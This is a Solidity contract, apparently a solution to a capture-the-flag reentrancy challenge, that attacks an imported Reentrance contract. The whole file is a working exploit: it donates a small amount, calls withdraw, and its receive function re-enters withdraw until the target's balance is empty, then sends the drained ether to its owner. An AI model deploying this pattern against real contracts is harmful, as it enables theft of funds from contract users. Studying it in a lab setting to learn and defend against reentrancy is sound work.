// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract ReentranceAttack {
    Reentrance r;
    uint v = 0.001 ether;
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function attack(address payable target) public payable {
        r = Reentrance(target);
        r.donate{value: v}(address(this));
        r.withdraw(v);
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "call failed");
    }

    receive() external payable {
        if (address(r).balance > 0) {
            r.withdraw(v);
        }
    }
}